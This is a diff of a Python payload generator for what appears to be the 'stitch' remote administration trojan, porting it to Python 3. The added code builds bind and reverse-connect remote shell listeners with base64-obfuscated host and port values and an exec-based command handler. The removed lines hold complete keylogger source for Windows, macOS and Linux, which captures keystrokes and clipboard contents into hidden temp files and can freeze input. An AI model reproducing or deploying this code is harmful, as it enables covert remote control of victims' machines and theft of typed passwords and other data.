@@ -11,7 +11,7 @@ for n in range(0,10):
 #                       st_main.py stitch_gen variables                        #
 ################################################################################
 
-main_imports = '''#!/usr/bin/env python
+main_imports = '''
 from st_utils import *
 
 class stitch_payload():
@@ -29,8 +29,8 @@ def add_bind_server(BHOST,BPORT):
             print('creating server')
         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        target = base64.b64decode("{}")
-        port = int(base64.b64decode("{}"))
+        target = base64.b64decode("{}").decode()
+        port = int(base64.b64decode("{}").decode())
         server.bind((target,port))
         server.listen(5)
         while True:
@@ -43,7 +43,7 @@ def add_bind_server(BHOST,BPORT):
                 client_socket.settimeout(None)
             except Exception as e:
                 if dbg:
-                    print e
+                    print(e)
                 client_socket=None
                 pass
             if client_socket:
@@ -74,9 +74,10 @@ def add_listen_server(LHOST,LPORT):
                 print('trying to connect')
             client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
             client_socket.settimeout(5)
-            target = base64.b64decode("{}")
-            port = int(base64.b64decode("{}"))
+            target = base64.b64decode("{}").decode()
+            port = int(base64.b64decode("{}").decode())
             try:
                 client_socket.connect((target,port))
                 client_socket.settimeout(300)
@@ -89,11 +90,90 @@ def add_listen_server(LHOST,LPORT):
                     client_socket.close()
             except Exception as e:
                 if dbg:
-                    print e
+                    print(e)
+                client_socket.close()
+                self.connected = False
+
+    def halt_listen_server(self):
+        self.stop_listen_server = True\n\n'''.format(LHOST,LPORT)
+
+def add_win_listen_server(LHOST,LPORT):
+    return '''
+    def listen_server(self):
+        self.stop_listen_server  = False
+        while True:
+            if self.stop_listen_server :
+                break
+            while self.connected:
+                sleep(5)
+                pass
+            if dbg:
+                print('trying to connect')
+            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+            client_socket.ioctl(socket.SIO_KEEPALIVE_VALS, (1, 10000, 3000))
+            client_socket.settimeout(5)
+            target = base64.b64decode("{}").decode()
+            port = int(base64.b64decode("{}").decode())
+            try:
+                client_socket.connect((target,port))
+                client_socket.settimeout(300)
+                if not self.connected:
+                    self.connected = True
+                    client_handler(client_socket)
+                    self.connected = False
+                else:
+                    send(client_socket,"[!] Another stitch shell has already been established.\\n")
+                    client_socket.close()
+            except Exception as e:
+                if dbg:
+                    print(e)
+                client_socket.close()
+                self.connected = False
+
+    def halt_listen_server(self):
+        self.stop_listen_server = True\n\n'''.format(LHOST,LPORT)
+
+def add_lnx_listen_server(LHOST,LPORT):
+    return '''
+    def listen_server(self):
+        self.stop_listen_server  = False
+        while True:
+            if self.stop_listen_server :
+                break
+            while self.connected:
+                sleep(5)
+                pass
+            if dbg:
+                print('trying to connect')
+            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+            client_socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, after_idle_sec)
+            client_socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, interval_sec)
+            client_socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, max_fails)
+            client_socket.settimeout(5)
+            target = base64.b64decode("{}").decode()
+            port = int(base64.b64decode("{}").decode())
+            try:
+                client_socket.connect((target,port))
+                client_socket.settimeout(300)
+                if not self.connected:
+                    self.connected = True
+                    client_handler(client_socket)
+                    self.connected = False
+                else:
+                    send(client_socket,"[!] Another stitch shell has already been established.\\n")
+                    client_socket.close()
+            except Exception as e:
+                if dbg:
+                    print(e)
                 client_socket.close()
 
     def halt_listen_server(self):
         self.stop_listen_server = True\n\n'''.format(LHOST,LPORT)
+
 
 def add_listen_bind_main():
     return'''
@@ -113,7 +193,7 @@ def main():
             pass
         except Exception as e:
             if dbg:
-                print e
+                print(e)
             pass
         st_pyld.halt_bind_server()
         st_pyld.halt_listen_server()
@@ -201,13 +281,13 @@ import shutil
 import zipfile
 import datetime
 import requests
-import StringIO
 import platform
 import threading
 import subprocess
+from io import StringIO
 from st_protocol import *
 from st_encryption import *
-from mss import ScreenshotError
+from mss.exception import ScreenShotError
 from time import strftime, sleep
 from contextlib import contextmanager\n'''
 
@@ -266,16 +346,16 @@ def pyexec({7},client_socket,pylib=False):
     response = ''
     if pylib:
         try:
-            exec {7}
+            exec({7})
         except Exception as e:
-            {5} = "[!] PYEXEC(): {{}}".format(str(e))
+            {5} = f"[!] PYEXEC(): {{e}}"
             {3}(client_socket,{5})
     else:
         with stdoutIO() as s:
             try:
-                exec {7}
+                exec({7})
             except Exception as e:
-                {5} = "[!] PYEXEC(): {{}}".format(str(e))
+                {5} = f"[!] PYEXEC(): {{e}}"
                 {3}(client_socket,{5})
         r = s.getvalue()
         {3}(client_socket,r)
@@ -329,9 +409,9 @@ def stitch_running():
     if {9}.endswith('.py') or {9}.endswith('.pyc'):
         {9} = 'python.exe'
     if win_client():
-        {7} = base64.b64decode('QzpcV2luZG93c1xUZW1wOnN0c2hlbGwubG9n')
+        {7} = base64.b64decode('QzpcVXNlcnNcZ3VhaWRcc3RJbnN0YWxsLmxvZw==').decode()
     else:
-        {7} = base64.b64decode('L3RtcC8uc3RzaGVsbC5sb2c=')
+        {7} = base64.b64decode('L3RtcC8uc3RzaGVsbC5sb2c=').decode()
     if os.path.exists({7}):
         with open({7},'r') as st:
             data = st.readlines()
@@ -360,7 +440,7 @@ def zipdir(path, zipn):
 def stdoutIO(stdout=None):
     prev = sys.stdout
     if stdout is None:
-        stdout = StringIO.StringIO()
+        stdout = StringIO()
     sys.stdout = stdout
     yield stdout
     sys.stdout = prev
@@ -372,28 +452,30 @@ def client_handler({2}):
     {8} = get_desktop()
     if os.path.exists({8}):
         os.chdir({8})
-    try:
-        {3}({2},'c3RpdGNoX3NoZWxs',encryption=False)
-        {3}({2},abbrev, encryption=False)
-        {3}({2},{6})
-        {3}({2},{6})
-        {3}({2},user)
-        {3}({2},hostname)
-        {3}({2},platform.platform())
-        cmd_buffer=""
-        while N:
+
+    {3}({2},'c3RpdGNoX3NoZWxs',encryption=False)
+    {3}({2},abbrev, encryption=False)
+    {3}({2},{6})
+    {3}({2},user)
+    {3}({2},hostname)
+    {3}({2},platform.platform())
+    cmd_buffer=""
+
+    while N:
+        try:
             cmd_buffer = receive({2})
             if not cmd_buffer: break
             if cmd_buffer == "end_connection": break
-            determine_cmd(str(cmd_buffer),{2})
-        {2}.close()
-    except Exception as e:
-        if dbg:
-            print e
-        {2}.close()
+            determine_cmd(cmd_buffer.decode(),{2})
+        except socket.timeout as e:
+            print(e)
+        except Exception as e:
+            if dbg:
+                print(e)
+            {2}.close()
+            break
 
 dbg = False
-nt_kl = keylogger()
 script_dir = os.path.dirname(os.path.realpath(sys.argv[0]))\n
 '''.format(st_obf[0],st_obf[1],st_obf[2],st_obf[3],st_obf[4],st_obf[5],st_obf[6],
             st_obf[7],st_obf[8],st_obf[9])
@@ -417,16 +499,12 @@ def reg_exists(path):
 
 def win_util_imports():
     return '''
-import vidcap
-import pyHook
 import winreg
 import pythoncom
 from ctypes import *
 import win32clipboard
 from mss.windows import MSS
-from st_win_keylogger import *
 from PIL import Image, ImageFile
-from creddump.hashdump import dump_file_hashes
 '''
 
 def osx_util_imports():
@@ -434,7 +512,6 @@ def osx_util_imports():
 import pexpect
 import pexpect.pxssh
 from mss.darwin import MSS
-from st_osx_keylogger import *
 from PyObjCTools import AppHelper
 from Foundation import NSObject, NSLog
 from Cocoa import NSEvent, NSKeyDownMask
@@ -446,8 +523,7 @@ def lnx_util_imports():
 import pexpect
 import pyxhook
 import pexpect.pxssh
-from mss.linux import MSS
-from st_lnx_keylogger import *\n
+from mss.linux import MSS\n
 '''
 
 ################################################################################
@@ -464,6 +540,8 @@ abbrev = '{2}'
 {0} = base64.b64decode('{1}')
 
 def encrypt(raw):
+    if type(raw) is not bytes:
+        raw = raw.encode()
     iv = Random.new().read( AES.block_size )
     cipher = AES.new({0}, AES.MODE_CFB, iv )
     return (base64.b64encode( iv + cipher.encrypt( raw ) ) )
@@ -485,8 +563,8 @@ import socket
 import struct
 from st_encryption import *
 
-st_eof = base64.b64decode('c3RpdGNoNjI2aGN0aXRz')
-st_complete = base64.b64decode('c3RpdGNoLjpjb21wbGV0ZTouY2h0aXRz')
+st_eof = base64.b64decode('V2hhdCBpcyB0aGUgbWVhbmluZyBvZiBsaWZl')
+st_complete = base64.b64decode('NDI=')
 
 def recvall(sock, count, size=False):
     buf = b''
@@ -506,6 +584,8 @@ def send(sock, data, encryption=True):
             cmd = data[:1024]
         length = len(cmd)
         sock.sendall(struct.pack('!i', length))
+        if type(cmd) is not bytes:
+            cmd = cmd.encode()
         sock.sendall(cmd)
         data = data[1024:]
     if encryption:
@@ -517,7 +597,7 @@ def send(sock, data, encryption=True):
     sock.sendall(eof)
 
 def receive(sock,silent=False,timeout=True):
-    full_response=''
+    full_response=b''
     while True:
         lengthbuf = recvall(sock, 4, size=True)
         length, = struct.unpack('!i', lengthbuf)
@@ -527,383 +607,6 @@ def receive(sock,silent=False,timeout=True):
         else:
             break
     return full_response
-'''
-
-################################################################################
-#                       st_win_keylogger.py stitch_gen variables               #
-################################################################################
-
-def get_win_keylogger():
-    return '''
-import os
-import sys
-import time
-import ctypes
-import pyHook
-import datetime
-import pythoncom
-import threading
-import subprocess
-from ctypes import *
-import win32clipboard
-
-class keylogger():
-
-    def __init__(self):
-        self.kl_status = False
-        self.frz_status = False
-        self.active_window = ''
-        self.log_file = 'C:\\Windows\\Temp:stkl.log'
-
-    def start(self):
-        kl_summary = ''
-        self.kl_status= True
-        now = datetime.datetime.now()
-        start_time=now.strftime("%Y-%m-%d %H:%M:%S")
-        kl_summary = "\\n[ {} ] - Keylogger is now running".format(start_time)
-        self.log_handle = open(self.log_file,'a')
-        self.log_handle.write(kl_summary)
-        self.thread = threading.Thread(target=self.run)
-        self.thread.start()
-
-    def start_freeze(self):
-        self.frz_status = True
-        self.thread = threading.Thread(target=self.run_freeze)
-        self.thread.start()
-
-    def win_get_clipboard(self):
-        try:
-            win32clipboard.OpenClipboard()
-            pasted_value = win32clipboard.GetClipboardData()
-            win32clipboard.CloseClipboard()
-            return pasted_value
-        except Exception:
-            return
-
-    def get_active_win(self):
-        kl_summary = ''
-        hwnd = self.user32.GetForegroundWindow()
-        pid = c_ulong(0)
-        self.user32.GetWindowThreadProcessId(hwnd, byref(pid))
-        process_id = "{}".format(pid.value)
-        executable = create_string_buffer("\\x00" * 512)
-        h_process = self.kernel32.OpenProcess(0x400 | 0x10, False, pid)
-        self.psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
-        window_title = create_string_buffer("\\x00" * 512)
-        length = self.user32.GetWindowTextA(hwnd, byref(window_title),512)
-        now = datetime.datetime.now()
-        proc_time=now.strftime("%Y-%m-%d %H:%M:%S")
-        proc_info = "[ %s ][ PID: %s - %s - %s ]" % (proc_time, process_id, executable.value, window_title.value)
-        kl_summary = "\\n\\n"
-        kl_summary += proc_info
-        kl_summary += "\\n"
-        if self.kl_status:
-            self.log_handle.write(kl_summary)
-
-        # close handles
-        self.kernel32.CloseHandle(hwnd)
-        self.kernel32.CloseHandle(h_process)
-
-    def KeyStroke(self,event):
-        kl_summary = ''
-        if self.kl_status:
-            if event.WindowName != self.active_window:
-                self.active_window = event.WindowName
-                self.get_active_win()
-                self.key_count = 0
-            if self.key_count > 75:
-                kl_summary += "\\n"
-                self.key_count = 0
-            if event.Ascii > 32 and event.Ascii < 127:
-                kl_summary += chr(event.Ascii)
-                self.key_count += 1
-            else:
-                if event.Key == "V":
-                    try:
-                        pasted_value = self.win_get_clipboard()
-                        kl_summary += "[PASTE] - {}".format(pasted_value)
-                        self.key_count += 10+len(pasted_value)
-                        self.last_pasted_value = pasted_value
-                    except Exception as e:
-                        if 'access is denied' in str(e).lower():
-                            kl_summary += "[PASTE] - {}".format(self.last_pasted_value)
-                            self.key_count += 10+len(last_pasted_value)
-                else:
-                    kl_summary += "[{}]".format(event.Key)
-                    self.key_count += 2+len(event.Key)
-            self.log_handle.write(kl_summary)
-        return True
-
-    def run(self):
-        kl_summary = ''
-        self.kl_status= True
-        self.key_count = 0
-        self.kl = pyHook.HookManager()
-        self.psapi = ctypes.windll.psapi
-        self.user32 = ctypes.windll.user32
-        self.kernel32 = ctypes.windll.kernel32
-        self.pasted_value = self.win_get_clipboard()
-
-        while self.kl_status:
-            self.kl.KeyDown = self.KeyStroke
-            self.kl.HookKeyboard()
-            while self.kl_status:
-                pythoncom.PumpWaitingMessages()
-            self.kl.__del__()
-        now = datetime.datetime.now()
-        end_time=now.strftime("%Y-%m-%d %H:%M:%S")
-        kl_summary = "\\n\\n[ {} ] - Keylogger has been stopped\\n".format(end_time)
-        self.log_handle.write(kl_summary)
-        self.log_handle.close()
-
-    def keyFreeze(self,event):
-        return False
-
-    def keyUnfreeze(self,event):
-        return True
-
-    def run_freeze(self):
-        while self.frz_status:
-            freezer = pyHook.HookManager()
-            freezer.MouseAll = self.keyFreeze
-            freezer.KeyAll = self.keyFreeze
-            freezer.HookMouse()
-            freezer.HookKeyboard()
-            while self.frz_status:
-                pythoncom.PumpWaitingMessages()
-            freezer.MouseAll = self.keyUnfreeze
-            freezer.KeyAll = self.keyUnfreeze
-            freezer.HookMouse()
-            freezer.HookKeyboard()
-            freezer.__del__()
-
-    def stop(self):
-        self.kl_status = False
-
-    def stop_freeze(self):
-        self.frz_status = False
-
-    def get_status(self):
-        return self.kl_status
-
-    def get_frz_status(self):
-        return self.frz_status
-
-    def dump_logs(self):
-        with open(self.log_file,'rb') as s:
-            resp = ''
-            data = s.readlines()
-            for line in data:
-                resp += line
-        return resp
-
-    def get_dump(self):
-        if self.get_status():
-            self.kl_status = False
-            self.log_handle.close()
-            resp=self.dump_logs()
-            self.log_handle = open(self.log_file,'w')
-            self.kl_status = True
-            self.active_window = ''
-            self.key_count = 0
-        else:
-            resp=self.dump_logs()
-        return str(resp)
-
-def start_st_kl():
-    try:
-        st_kl = keylogger()
-        st_kl.start()
-        return True
-    except Exception as e:
-        return "ERROR: {}".format(e)
-'''
-
-
-################################################################################
-#                       st_osx_keylogger.py stitch_gen variables               #
-################################################################################
-
-def get_osx_keylogger():
-    return '''
-import re
-import time
-import datetime
-import threading
-from AppKit import NSApplication, NSApp, NSWorkspace
-from Foundation import NSObject, NSLog
-from Cocoa import NSEvent, NSKeyDownMask
-from PyObjCTools import AppHelper
-
-class keylogger():
-
-    def __init__(self):
-        self.log_file = '/tmp/.stkl.log'
-        self.kl_status = False
-        mask = NSKeyDownMask
-        self.st_monitor = NSEvent.addGlobalMonitorForEventsMatchingMask_handler_(mask,self.KeyStroke)
-        self.active_window = ''
-
-    def KeyStroke(self,event):
-        if self.kl_status:
-            try:
-                self.check_active_win()
-                self.key_count += 1
-                keystroke = re.findall(' chars="(.)" ',str(event))[0]
-                self.log_handle.write(keystroke)
-                if self.key_count > 75:
-                    self.log_handle.write('\\n')
-                    self.key_count = 0
-                #self.log_handle.write(str(event))
-            except Exception as e:
-                pass
-
-    def check_active_win(self):
-        if NSWorkspace.sharedWorkspace().activeApplication()['NSApplicationName'] not in self.active_win:
-            self.active_window = NSWorkspace.sharedWorkspace().activeApplication()['NSApplicationName']
-            now = datetime.datetime.now()
-            start_time=now.strftime("%Y-%m-%d %H:%M:%S")
-            kl_summary = "\\n\\n[ {} ] - {}\\n".format(start_time,self.active_window)
-            self.log_handle.write(kl_summary)
-
-    def start(self):
-        self.log_handle = open(self.log_file,'a')
-        self.kl_status = True
-        self.key_count = 0
-        now = datetime.datetime.now()
-        start_time=now.strftime("%Y-%m-%d %H:%M:%S")
-        kl_summary = "\\n[ {} ] - Keylogger is now running".format(start_time)
-        self.log_handle.write(kl_summary)
-
-    def stop(self):
-        self.kl_status = False
-        now = datetime.datetime.now()
-        end_time=now.strftime("%Y-%m-%d %H:%M:%S")
-        kl_summary = "\\n\\n[ {} ] - Keylogger has been stopped\\n".format(end_time)
-        self.log_handle.write(kl_summary)
-        self.log_handle.close()
-
-    def get_status(self):
-        return self.kl_status
-
-    def dump_logs(self):
-        with open(self.log_file,'rb') as s:
-            resp = ''
-            data = s.readlines()
-            for line in data:
-                if '\\x7f' in line:
-                    line = line.replace('\\x7f','[BS]')
-                resp += line
-        return resp
-
-    def get_dump(self):
-        if self.get_status():
-            self.kl_status = False
-            self.log_handle.close()
-            resp=self.dump_logs()
-            self.log_handle = open(self.log_file,'w')
-            self.kl_status = True
-            self.active_window = ''
-            self.key_count = 0
-        else:
-            resp=self.dump_logs()
-        return str(resp)
-'''
-
-################################################################################
-#                       st_lnx_keylogger.py stitch_gen variables               #
-################################################################################
-
-def get_lnx_keylogger():
-    return '''
-import os
-import sys
-import time
-import pyxhook
-import datetime
-import threading
-
-class keylogger():
-
-    def __init__(self):
-        self.kl_status = False
-        self.active_window = ''
-        self.active_proc = ''
-        self.log_file = '/tmp/.stkl.log'
-
-    def start(self):
-        self.log_handle = open(self.log_file,'a')
-        self.kl_status = True
-        self.key_count = 0
-        now = datetime.datetime.now()
-        start_time=now.strftime("%Y-%m-%d %H:%M:%S")
-        kl_summary = "\\n[ {} ] - Keylogger is now running".format(start_time)
-        self.log_handle.write(kl_summary)
-        self.thread = threading.Thread(target=self.run)
-        self.thread.start()
-
-    def run(self):
-        self.kl_hook=pyxhook.HookManager()
-        self.kl_hook.KeyDown=self.KeyStroke
-        self.kl_hook.HookKeyboard()
-        self.kl_hook.start()
-
-    def KeyStroke(self,event):
-        if self.kl_status:
-            kl_summary = ''
-            self.check_active_win(event.WindowName, event.WindowProcName)
-            if self.key_count > 75:
-                self.log_handle.write("\\n")
-                self.key_count = 0
-            if len(event.Key) > 1:
-                self.log_handle.write('[{}]'.format(event.Key))
-                self.key_count += len(event.Key) + 2
-            else:
-                self.log_handle.write(event.Key)
-                self.key_count += 1
-
-    def check_active_win(self, win_name, win_proc):
-        if win_name != self.active_window or win_proc != self.active_proc:
-            self.active_window = win_name
-            self.active_proc = win_proc
-            now = datetime.datetime.now()
-            start_time=now.strftime("%Y-%m-%d %H:%M:%S")
-            kl_summary = "\\n\\n[ {} ] - {}: {}\\n".format(start_time,self.active_window,self.active_proc)
-            self.log_handle.write(kl_summary)
-
-    def stop(self):
-        self.kl_status = False
-        self.kl_hook.cancel()
-        now = datetime.datetime.now()
-        end_time=now.strftime("%Y-%m-%d %H:%M:%S")
-        kl_summary = "\\n\\n[ {} ] - Keylogger has been stopped\\n".format(end_time)
-        self.log_handle.write(kl_summary)
-        self.log_handle.close()
-
-    def get_status(self):
-        return self.kl_status
-
-    def dump_logs(self):
-        with open(self.log_file,'rb') as s:
-            resp = ''
-            data = s.readlines()
-            for line in data:
-                resp += line
-        return resp
-
-    def get_dump(self):
-        if self.get_status():
-            self.kl_status = False
-            self.log_handle.close()
-            resp=self.dump_logs()
-            self.log_handle = open(self.log_file,'w')
-            self.kl_status = True
-            self.active_window = ''
-            self.active_proc = ''
-            self.key_count = 0
-        else:
-            resp=self.dump_logs()
-        return str(resp)
 '''
 
 ################################################################################
@@ -1042,7 +745,7 @@ import threading
 import subprocess
 from Crypto import Random
 from Crypto.Cipher import AES
-from mss.exception import ScreenshotError
+from mss.exception import ScreenShotError
 from time import strftime, sleep
 from contextlib import contextmanager
 from base64 import b64decode as INFO
